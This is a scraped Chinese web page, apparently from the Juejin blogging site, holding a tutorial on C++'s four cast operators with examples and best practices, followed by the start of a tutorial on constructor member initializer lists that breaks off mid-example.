p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在C++中，类型转换是将一种数据类型转换为另一种数据类型的过程。与C语言简单的<code>(type)value</code>强制转换不同，C++提供了四种专门的强制类型转换运算符，它们不仅执行转换，还提供了编译时检查和更明确的语义。这体现了C++"类型安全"的设计哲学。</p>
<h2 data-id="heading-0">C++四种强制类型转换运算符</h2>
<h3 data-id="heading-1">1. static_cast - 静态类型转换</h3>
<p><code>static_cast</code>是最常用的转换运算符，用于编译时已知的、相对安全的类型转换。</p>
<p><strong>语法：</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">static_cast</span>&lt;new_type&gt;(expression)
</code></pre>
<p><strong>典型应用场景：</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 基本类型转换</span>
<span class="hljs-type">float</span> f = <span class="hljs-number">3.14</span>;
<span class="hljs-type">int</span> i = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(f);  <span class="hljs-comment">// 3</span>

<span class="hljs-comment">// 相关类层次结构中的向上转换（安全）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {};
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base {};
Derived d;
Base* b = <span class="hljs-built_in">static_cast</span>&lt;Base*&gt;(&amp;d);  <span class="hljs-comment">// 向上转换，安全</span>

<span class="hljs-comment">// void*到具体指针类型的转换</span>
<span class="hljs-type">void</span>* p = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>));
<span class="hljs-type">int</span>* ip = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>*&gt;(p);
</code></pre>
<p><strong>特点：</strong></p>
<ul>
<li>编译时检查类型兼容性</li>
<li>不能移除const/volatile限定符</li>
<li>不能用于无关类型指针间的转换</li>
</ul>
<h3 data-id="heading-2">2. dynamic_cast - 动态类型转换</h3>
<p><code>dynamic_cast</code>专门用于处理多态类型，在运行时检查转换的安全性。</p>
<p><strong>语法：</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">dynamic_cast</span>&lt;new_type&gt;(expression)
</code></pre>
<p><strong>典型应用场景：</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> { <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span> </span>{} };  <span class="hljs-comment">// 必须有虚函数</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base {};

Base* b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Derived</span>();

<span class="hljs-comment">// 向下转换（运行时检查）</span>
Derived* d = <span class="hljs-built_in">dynamic_cast</span>&lt;Derived*&gt;(b);
<span class="hljs-keyword">if</span> (d != <span class="hljs-literal">nullptr</span>) {
    <span class="hljs-comment">// 转换成功</span>
}

<span class="hljs-comment">// 交叉转换（多重继承场景）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> { <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span> </span>{} };
<span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> { <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">bar</span><span class="hljs-params">()</span> </span>{} };
<span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> : <span class="hljs-keyword">public</span> A, <span class="hljs-keyword">public</span> B {};

A* a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">C</span>();
B* b = <span class="hljs-built_in">dynamic_cast</span>&lt;B*&gt;(a);  <span class="hljs-comment">// 正确的交叉转换</span>
</code></pre>
<p><strong>重要特性：</strong></p>
<ul>
<li>运行时类型检查</li>
<li>失败时返回nullptr（指针）或抛出std::bad_cast异常（引用）</li>
<li>只适用于含虚函数的类（多态类型）</li>
<li>性能开销较大</li>
</ul>
<h3 data-id="heading-3">3. const_cast - 常量性转换</h3>
<p><code>const_cast</code>专门用于修改类型的const或volatile限定符。</p>
<p><strong>语法：</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">const_cast</span>&lt;new_type&gt;(expression)
</code></pre>
<p><strong>典型应用场景：</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 移除const限定符</span>
<span class="hljs-type">const</span> <span class="hljs-type">int</span> ci = <span class="hljs-number">10</span>;
<span class="hljs-type">int</span>* modifiable = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">int</span>*&gt;(&amp;ci);
<span class="hljs-comment">// 注意：修改原const对象是未定义行为</span>

<span class="hljs-comment">// 在已知对象实际非常量时的合法使用</span>
<span class="hljs-type">int</span> actual_var = <span class="hljs-number">20</span>;
<span class="hljs-type">const</span> <span class="hljs-type">int</span>* pc = &amp;actual_var;
<span class="hljs-type">int</span>* p = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">int</span>*&gt;(pc);  <span class="hljs-comment">// 合法，actual_var本就不是const</span>

<span class="hljs-comment">// 用于调用旧的C风格API</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">legacy_api</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span>;
<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg = <span class="hljs-string">"Hello"</span>;
<span class="hljs-built_in">legacy_api</span>(<span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(msg));
</code></pre>
<p><strong>安全警告：</strong></p>
<ul>
<li>不能用于改变实际类型</li>
<li>修改原const对象是未定义行为</li>
<li>应谨慎使用，通常表示设计有问题</li>
</ul>
<h3 data-id="heading-4">4. reinterpret_cast - 重新解释转换</h3>
<p><code>reinterpret_cast</code>提供低层次的重新解释，是最危险的转换。</p>
<p><strong>语法：</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">reinterpret_cast</span>&lt;new_type&gt;(expression)
</code></pre>
<p><strong>典型应用场景：</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 指针与整数间的转换</span>
<span class="hljs-type">intptr_t</span> address = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">intptr_t</span>&gt;(&amp;obj);

<span class="hljs-comment">// 无关指针类型间的转换</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Data</span> { <span class="hljs-type">int</span> x; <span class="hljs-type">double</span> y; };
Data* data = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Data</span>();
<span class="hljs-type">char</span>* buffer = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(data);  <span class="hljs-comment">// 用于序列化</span>

<span class="hljs-comment">// 函数指针转换</span>
<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*FuncPtr)</span><span class="hljs-params">()</span></span>;
FuncPtr fp = <span class="hljs-built_in">reinterpret_cast</span>&lt;FuncPtr&gt;(<span class="hljs-number">0x12345678</span>);  <span class="hljs-comment">// 危险！</span>
</code></pre>
<p><strong>危险特性：</strong></p>
<ul>
<li>几乎不进行任何运行时检查</li>
<li>滥用会导致未定义行为</li>
<li>通常是平台相关的</li>
<li>应作为最后手段使用</li>
</ul>
<h2 data-id="heading-5">对比分析</h2>



































<table><thead><tr><th>转换类型</th><th>检查时机</th><th>安全性</th><th>典型用途</th></tr></thead><tbody><tr><td>static_cast</td><td>编译时</td><td>较高</td><td>相关类型转换、数值转换</td></tr><tr><td>dynamic_cast</td><td>运行时</td><td>高</td><td>多态类型向下/交叉转换</td></tr><tr><td>const_cast</td><td>编译时</td><td>低</td><td>添加/移除const/volatile</td></tr><tr><td>reinterpret_cast</td><td>无检查</td><td>极低</td><td>低层二进制操作</td></tr></tbody></table>
<h2 data-id="heading-6">最佳实践</h2>
<h3 data-id="heading-7">1. 转换选择指南</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 优先使用static_cast进行相关类型转换</span>
<span class="hljs-type">double</span> d = <span class="hljs-number">3.14</span>;
<span class="hljs-type">int</span> i = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(d);  <span class="hljs-comment">// 推荐</span>
<span class="hljs-comment">// int i = (int)d;            // C风格，不推荐</span>

<span class="hljs-comment">// 多态类型使用dynamic_cast</span>
Base* base = <span class="hljs-built_in">getObject</span>();
<span class="hljs-keyword">if</span> (Derived* derived = <span class="hljs-built_in">dynamic_cast</span>&lt;Derived*&gt;(base)) {
    <span class="hljs-comment">// 安全地使用derived</span>
}

<span class="hljs-comment">// 避免const_cast，除非必要</span>
<span class="hljs-comment">// 通常意味着API设计有问题</span>
</code></pre>
<h3 data-id="heading-8">2. 设计考虑</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 使用虚函数代替dynamic_cast</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">makeSound</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;  <span class="hljs-comment">// 多态设计</span>
    <span class="hljs-comment">// 优于使用dynamic_cast检查类型</span>
};

<span class="hljs-comment">// 使用模板避免类型转换</span>
<span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;
T* <span class="hljs-title">safe_cast</span><span class="hljs-params">(Base* base)</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">dynamic_cast</span>&lt;T*&gt;(base);
}
</code></pre>
<h3 data-id="heading-9">3. 现代C++的改进</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// C++17的std::any和std::variant</span>
std::any anything = <span class="hljs-number">42</span>;
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">int</span> i = std::<span class="hljs-built_in">any_cast</span>&lt;<span class="hljs-type">int</span>&gt;(anything);
} <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> std::bad_any_cast&amp; e) {
    <span class="hljs-comment">// 类型安全</span>
}

<span class="hljs-comment">// std::variant类型安全访问</span>
std::variant&lt;<span class="hljs-type">int</span>, std::string&gt; v = <span class="hljs-string">"hello"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span>* p = std::<span class="hljs-built_in">get_if</span>&lt;std::string&gt;(&amp;v)) {
    <span class="hljs-comment">// 类型安全访问</span>
}
</code></pre>
<h2 data-id="heading-10">与C风格转换的对比</h2>
<p>C风格转换<code>(type)value</code>的问题：</p>
<ol>
<li>意图不明确</li>
<li>可能执行多种不同转换</li>
<li>难以搜索和重构</li>
<li>缺乏类型安全检查</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 不明确的C风格转换</span>
Base* b = (Base*)ptr;  <span class="hljs-comment">// 这是什么转换？static？reinterpret？</span>

<span class="hljs-comment">// 明确的C++转换</span>
Base* b1 = <span class="hljs-built_in">static_cast</span>&lt;Base*&gt;(ptr);     <span class="hljs-comment">// 明确是static_cast</span>
Base* b2 = <span class="hljs-built_in">dynamic_cast</span>&lt;Base*&gt;(ptr);    <span class="hljs-comment">// 明确是dynamic_cast</span>
Base* b3 = <span class="hljs-built_in">reinterpret_cast</span>&lt;Base*&gt;(ptr); <span class="hljs-comment">// 明确是reinterpret_cast</span>
</code></pre>
<h2 data-id="heading-11">总结</h2>
<p>C++的强制类型转换系统提供了比C语言更安全、更明确的类型转换机制。正确使用这些转换运算符可以提高代码的：</p>
<ol>
<li><strong>类型安全性</strong>：减少运行时错误</li>
<li><strong>可读性</strong>：明确表达转换意图</li>
<li><strong>可维护性</strong>：易于搜索和重构</li>
<li><strong>性能</strong>：适当的编译时优化</li>
</ol>
<p>在实际开发中，应遵循以下原则：</p>
<ul>
<li>优先使用C++风格转换</li>
<li>选择最具体、最安全的转换类型</li>
<li>尽量避免使用reinterpret_cast和const_cast</li>
<li>考虑使用多态、模板等设计替代类型转换</li>
<li>在必须转换时添加充分的注释和错误处理</li>
</ul>
<p>通过合理使用这些工具，开发者可以在需要类型转换的场合既保持灵活性，又维护类型安全，这是C++作为系统级语言的重要优势之一。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【精华】C++成员初始化列表完全指南：为什么、何时以及如何正确使用]]></title>    <link>https://juejin.cn/post/7580373352420179994</link>    <guid>https://juejin.cn/post/7580373352420179994</guid>    <pubDate>2025-12-06T15:13:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580373352420179994" data-draft-id="7580329353353084974" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【精华】C++成员初始化列表完全指南：为什么、何时以及如何正确使用"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-06T15:13:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【精华】C++成员初始化列表完全指南：为什么、何时以及如何正确使用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T15:13:43.000Z" title="Sat Dec 06 2025 15:13:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文是我攒给自己的面试前必看文章之一，属于私藏。</p>
</blockquote>
<h2 data-id="heading-0">一个常见的误解</h2>
<p>许多C++初学者会有这样的疑问：“为什么我需要在构造函数后面加个冒号来初始化成员？在构造函数体内赋值不行吗？”本文将通过深入分析C++对象构造机制，彻底解答这个问题。</p>
<h2 data-id="heading-1">一、初始化列表的基本语法</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
    <span class="hljs-type">int</span> a;
    std::string str;
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 使用初始化列表</span>
    <span class="hljs-built_in">Example</span>(<span class="hljs-type">int</span> x, <span class="hljs-type">const</span> std::string&amp; s) : <span class="hljs-built_in">a</span>(x), <span class="hljs-built_in">str</span>(s) {
        <span class="hljs-comment">// 构造函数体</span>
    }
    
    <span class="hljs-comment">// 构造函数内赋值（对比）</span>
    <span class="hljs-built_in">Example</span>(<span class="hljs-type">int</span> x, <span class="hljs-type">const</span> std::string&amp; s) {
        a = x;
        str = s;
    }
};
</code></pre>
<h2 data-id="heading-2">二、初始化 vs 赋值的本质区别</h2>
<h3 data-id="heading-3">2.1 对象构造的时间线</h3>
<pre><code class="hljs language-markdown" lang="markdown">对象构造的完整流程：
<span class="hljs-bullet">1.</span> 分配对象内存
<span class="hljs-bullet">2.</span> 执行父类构造（如果有）
<span class="hljs-bullet">3.</span> 执行成员初始化列表
<span class="hljs-bullet">   -</span> 按声明顺序初始化所有成员
<span class="hljs-bullet">   -</span> 未在列表中的成员使用默认初始化
<span class="hljs-bullet">4.</span> 执行构造函数体
</code></pre>
<h3 data-id="heading-4">2.2 关键理解：所有成员都会被初始化</h3>
<p><strong>重要原则</strong>：无论是否出现在初始化列表中，所有成员变量都会在进入构造函数体之前被初始化。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> {
    <span class="hljs-type">int</span> x;      <span class="hljs-comment">// 声明1</span>
    std::string s; <span class="hljs-comment">// 声明2</span>
    <span class="hljs-type">int</span> y;      <span class="hljs-comment">// 声明3</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">Demo</span>() : <span class="hljs-built_in">y</span>(<span class="hljs-number">30</span>) {
        <span class="hljs-comment">// 实际执行顺序：</span>
        <span class="hljs-comment">// 1. x: 不在列表中 → 默认初始化（随机值）</span>
        <span class="hljs-comment">// 2. s: 不在列表中 → 调用std::string()默认构造函数</span>
        <span class="hljs-comment">// 3. y: 在列表中 → y = 30</span>
        <span class="hljs-comment">// 4. 进入构造函数体</span>
    }
};
</code></pre>
<h2 data-id="heading-5">三、必须使用初始化列表的四种情况</h2>
<h3 data-id="heading-6">3.1 const成员变量</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstMember</span> {
    <span class="hljs-type">const</span> <span class="hljs-type">int</span> id;  <span class="hljs-comment">// const成员</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 必须使用初始化列表</span>
    <span class="hljs-built_in">ConstMember</span>(<span class="hljs-type">int</span> value) : <span class="hljs-built_in">id</span>(value) { }
    
    <span class="hljs-comment">// 错误！const成员不能在构造函数体内赋值</span>
    <span class="hljs-comment">// ConstMember(int value) { id = value; }  // 编译错误！</span>
};
</code></pre>
<h3 data-id="heading-7">3.2 引用成员变量</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RefMember</span> {
    <span class="hljs-type">int</span>&amp; ref;  <span class="hljs-comment">// 引用成员</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 必须使用初始化列表</span>
    <span class="hljs-built_in">RefMember</span>(<span class="hljs-type">int</span>&amp; r) : <span class="hljs-built_in">ref</span>(r) { }
    
    <span class="hljs-comment">// 错误！引用必须在初始化时绑定</span>
    <span class="hljs-comment">// RefMember(int&amp; r) { ref = r; }  // 编译错误！</span>
};
</code></pre>
<h3 data-id="heading-8">3.3 没有默认构造函数的类成员</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NoDefault</span> {
    <span class="hljs-type">int</span> value;
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">NoDefault</span>(<span class="hljs-type">int</span> v) : <span class="hljs-built_in">value</span>(v) { }  <span class="hljs-comment">// 只有带参构造函数</span>
    <span class="hljs-comment">// 注意：没有 NoDefault() 默认构造函数！</span>
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Container</span> {
    NoDefault obj;  <span class="hljs-comment">// 需要初始化的成员</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 必须使用初始化列表</span>
    <span class="hljs-built_in">Container</span>(<span class="hljs-type">int</span> val) : <span class="hljs-built_in">obj</span>(val) { }
    
    <span class="hljs-comment">// 错误！编译器尝试调用obj.NoDefault()但不存在</span>
    <span class="hljs-comment">// Container(int val) { obj = NoDefault(val); }  // 编译错误！</span>
};
</code></pre>
<h3 data-id="heading-9">3.4 父类构造函数调用</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {
    <span class="hljs-type">int</span> baseValue;
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">Base</span>(<span class="hljs-type">int</span> v) : <span class="hljs-built_in">baseValue</span>(v) { }  <span class="hljs-comment">// 有参构造函数</span>
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base {
    <span class="hljs-type">int</span> derivedValue;
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 必须用初始化列表调用父类构造函数</span>
    <span class="hljs-built_in">Derived</span>(<span class="hljs-type">int</span> b, <span class="hljs-type">int</span> d) : <span class="hljs-built_in">Base</span>(b), <span class="hljs-built_in">derivedValue</span>(d) { }
    
    <span class="hljs-comment">// 错误！Base没有默认构造函数</span>
    <span class="hljs-comment">// Derived(int b, int d) { derivedValue = d; }  // 编译错误！</span>
};
</code></pre>
<h2 data-id="heading-10">四、初始化列表的性能优势</h2>
<h3 data-id="heading-11">4.1 类类型成员的性能差异</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceDemo</span> {
    std::string data;
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 低效方式：默认构造 + 赋值</span>
    <span class="hljs-built_in">PerformanceDemo</span>(<span class="hljs-type">const</span> std::string&amp; s) {
        data = s;  <span class="hljs-comment">// 执行了两次操作：</span>
                   <span class="hljs-comment">// 1. 默认构造空字符串</span>
                   <span class="hljs-comment">// 2. 赋值（可能涉及内存分配和复制）</span>
    }
    
    <span class="hljs-comment">// 高效方式：直接构造</span>
